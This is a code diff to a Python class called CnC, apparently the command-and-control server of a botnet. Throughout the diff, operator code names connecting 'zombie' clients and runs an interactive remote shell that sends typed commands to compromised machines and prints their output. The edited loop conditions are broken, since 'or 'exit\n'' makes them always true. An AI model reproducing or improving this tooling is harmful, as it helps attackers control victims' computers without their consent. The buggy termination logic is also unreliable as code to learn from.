@@ -38,7 +38,11 @@ class CnC:
             s = time.asctime() + ': ' + f'({addr[0]}:{addr[1]}) ' + response.decode('utf-8')
             print(s)
             f.write(s)
-        client_socket.send(b"ACK")
+            if s.split()[-1] == 'system!':
+                zombie = input("Zombie Name: ")
+                client_socket.send(bytes(zombie,'utf-8'))
+            else:
+                client_socket.send(b"ACK")
         while True:
             self.Ccommand = input("<*> ")
             #List active connections etc.
@@ -77,13 +81,15 @@ class CnC:
         time.sleep(1)
         print('<*> Shell initialised!')
         command = ''
-        while command != 'termminate':
+        while command != 'terminate\n' or 'exit\n':
             '''client_socket.send(bytes("pwd",'utf-8'))
             dir = client_socket.recv(4096).decode()
             command = input(dir+'> ')'''
             command = input("<*SHELL*> ")
-            client_socket.send(bytes(command,'utf-8'))
-            print(client_socket.recv(4096).decode())
+            if command.lower() != 'terminate\n' or 'exit\n':
+                print(command)
+                client_socket.send(bytes(command,'utf-8'))
+                print(client_socket.recv(4096).decode())
     
     def send(self):
         pass
